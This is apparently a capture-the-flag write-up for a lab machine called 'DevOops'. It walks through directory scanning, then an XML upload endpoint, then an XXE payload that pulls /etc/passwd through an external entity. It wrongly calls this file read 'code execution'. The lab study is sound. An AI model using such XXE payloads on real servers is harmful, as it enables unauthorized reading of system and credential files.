# DevOops

>skills this box involved:
- enumeration  
- git command use
- XXE file read

After carrying out our nmap scan we procede to the web browser to open up the http service and run a dirbuster scan on it
we can see that it comes back with two results.
```
/feed
/upload
```
Navigating to feed shows a static page and therefore nothing interesting however on the upload page there is a upload section where it allows us to upload xml files. We can now start creating a payload to get us code execution. We loads up burpSuite and intercept the request. The website mentions that we must have Author, Subject and Content tags in our xml so of course we add these.
```xml
<test>
  <Author>fieldraccoon</Author>
  <Subject>fieldraccoon</Subject>
  <Content>fieldraccoon</Content>
</test>
```
this is the data we add to our initial payload and we get a request back form the server.
```
PROCESSED BLOGPOST: 
  Author: fieldraccoon
 Subject: fieldraccoon
 Content: fieldraccoon
 URL for later reference: /uploads/exploit.xml
 File path: /home/roosa/deploy/src
 ```
 We see that there is a user called roosa in the file path. This is the user for this box. We now modify our payload to try and get code execution. This is the exploit:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>

<test>
  <Author>fieldraccoon</Author>
  <Subject>&file;</Subject>
  <Content>fieldraccoon</Content>
</test>
```


